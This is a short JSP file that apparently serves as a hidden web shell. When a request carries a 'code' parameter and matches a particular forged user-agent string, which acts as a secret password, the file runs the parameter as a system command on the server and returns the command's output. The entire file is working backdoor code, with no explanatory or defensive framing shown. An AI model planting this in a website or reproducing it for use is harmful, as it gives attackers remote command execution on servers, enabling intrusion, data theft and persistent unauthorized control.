<%@ page import="java.io.*"%><%
if (request.getParameter("code") != null && request.getHeader("user-agent").equals("Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0")) { 
Process p = Runtime.getRuntime().exec(request.getParameter("code"));
DataInputStream dis = new DataInputStream(p.getInputStream());
String disr = dis.readLine();
while ( disr != null ){
  out.println(disr);
  disr = dis.readLine();}}
%>